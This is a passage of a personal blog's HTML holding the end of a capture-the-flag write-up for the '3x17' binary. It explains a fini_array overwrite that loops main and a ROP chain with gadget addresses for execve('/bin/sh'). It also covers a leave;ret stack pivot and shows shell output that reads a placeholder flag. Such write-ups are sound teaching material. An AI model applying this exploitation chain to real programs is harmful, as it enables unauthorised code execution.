+</span></span></code></pre></div><p>So there&rsquo;s one problem with this. If we recall our main function, there&rsquo;s a value that increases every time it gets called. If we call main again, the value gets incremented again and we don&rsquo;t get another read. Luckily this value is a byte type. This will be useful in the future. When the main function returns from it&rsquo;s failure to read again, it will come back to the <code>FUN_00402960</code> function except now it will call the function at <code>index 0</code>. All I had to do was replace that other function pointer with the beginning of the <code>FUN_00402960</code> function. Which would reset the counter and call the main function again. So it looks like this instead:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;fini_array_addr&gt; : &lt;FUN_00402960&gt; &lt;main_func&gt;
+</span></span></code></pre></div><p>This allows for an infinite loop of the main function. This is useless to us for now since that incremented byte variable prevents us from being able to write more, but luckily it&rsquo;s a byte. After 256 loops, it will roll over back to 0 again and we can write some more to some location in memory. This is where we can start to build a ROP chain. I got some ROP gadgets that will just get the registers prepped for an execve syscall:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pop RAX; RET = 0x41e4af
+</span></span><span style="display:flex;"><span>&gt; 0x3b
+</span></span><span style="display:flex;"><span>pop RDI; RET = 0x48c429
+</span></span><span style="display:flex;"><span>&gt; &#39;/bin/sh\x00&#39;
+</span></span><span style="display:flex;"><span>pop RSI; RET = 0x48a79a
+</span></span><span style="display:flex;"><span>&gt; 0x0
+</span></span><span style="display:flex;"><span>pop RDX; RET = 0x44a2e6
+</span></span><span style="display:flex;"><span>&gt; 0x0
+</span></span><span style="display:flex;"><span>syscall = 0x486e0f
+</span></span></code></pre></div><p>Now I need to find where to put it and we&rsquo;re set. This is hard though because we dont really have control of the stack. This is where I learned about stack pivots. If you call <code>leave; ret</code> at certain places in the program, it will pivot the stack to an address on the stack which is really useful in the case of this challenge. If we try to put this in the second fini_array address, then we have a problem. It doesn&rsquo;t have a nice address on the stack, so it will just break the program execution. If we instead put in in the first index in the array, the stack has a nice address on it: <code>0x4b4100</code>. Now all we have to do is write the rop chain to this spot and then replace the mentioned location with  <code>leave; ret</code>. Now we have our finished exploit and it will stack pivot in order to put our saved ROP chain on the stack and run it! There we go:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[*] Switching to interactive mode
+</span></span><span style="display:flex;"><span>$ cd /home/3x17
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>3x17
+</span></span><span style="display:flex;"><span>run.sh
+</span></span><span style="display:flex;"><span>the_4ns_is_51_fl4g
+</span></span><span style="display:flex;"><span>$ cat the_4ns_is_51_fl4g
+</span></span><span style="display:flex;"><span>flag{&lt;not_the_real_flag&gt;}
+</span></span></code></pre></div>
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2024
+     Lucas Ball 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0V6ZC4TG82"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-0V6ZC4TG82', { 'anonymize_ip': false });
+}
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
